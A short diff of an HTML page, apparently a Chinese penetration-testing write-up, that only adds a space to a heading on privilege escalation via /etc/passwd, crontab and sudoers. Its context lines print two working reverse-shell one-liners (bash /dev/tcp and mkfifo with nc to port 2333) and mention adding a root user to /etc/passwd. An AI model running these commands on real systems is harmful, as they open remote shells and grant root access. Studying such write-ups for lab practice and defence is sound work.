@@ -268,7 +268,7 @@
 </ol>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">/bin/bash -i &gt;&amp; /dev/tcp/101.42.94.126/2333 0&gt;&amp;1<br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.3.15 2333 &gt;/tmp/f<br></code></pre></td></tr></table></figure>
 
-<h3 id="4-2-etc下passwd、crontab、sudoers的提权"><a href="#4-2-etc下passwd、crontab、sudoers的提权" class="headerlink" title="4.2/etc下passwd、crontab、sudoers的提权"></a>4.2/etc下passwd、crontab、sudoers的提权</h3><p>teehee的<strong>追加内容</strong>进行如下几种方式提权</p>
+<h3 id="4-2-etc下passwd、crontab、sudoers的提权"><a href="#4-2-etc下passwd、crontab、sudoers的提权" class="headerlink" title="4.2 /etc下passwd、crontab、sudoers的提权"></a>4.2 /etc下passwd、crontab、sudoers的提权</h3><p>teehee的<strong>追加内容</strong>进行如下几种方式提权</p>
 <ol>
 <li> /etc/passwd里添加root</li>
 </ol>
